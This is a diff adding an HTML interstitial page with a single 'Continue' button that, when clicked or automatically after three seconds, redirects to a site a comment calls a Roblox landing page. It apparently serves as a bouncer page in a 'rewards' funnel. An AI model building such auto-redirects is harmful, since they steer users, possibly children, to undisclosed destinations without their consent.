@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Continue</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 300px;
+            width: 100%;
+        }
+
+        .continue-btn {
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            min-height: 56px;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(0, 122, 255, 0.2);
+        }
+
+        .continue-btn:active {
+            transform: scale(0.98);
+            background: #0056CC;
+        }
+
+        .continue-btn:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.3);
+        }
+
+        /* Loading state */
+        .loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            margin: auto;
+            border: 2px solid transparent;
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="continueBtn" class="continue-btn">
+            Continue
+        </button>
+    </div>
+
+    <script>
+        // 🎯 REDIRECT URL - Change this to your main landing page
+        const REDIRECT_URL = 'https://www.viralrewardz.com/'; // Points to your main Roblox landing page
+        
+        document.getElementById('continueBtn').addEventListener('click', function() {
+            const btn = this;
+            
+            // Add loading state
+            btn.classList.add('loading');
+            btn.textContent = 'Loading...';
+            
+            // Redirect after short delay
+            setTimeout(function() {
+                window.location.href = REDIRECT_URL;
+            }, 500);
+        });
+
+        // Auto-redirect after 3 seconds if user doesn't click
+        setTimeout(function() {
+            if (!document.getElementById('continueBtn').classList.contains('loading')) {
+                window.location.href = REDIRECT_URL;
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
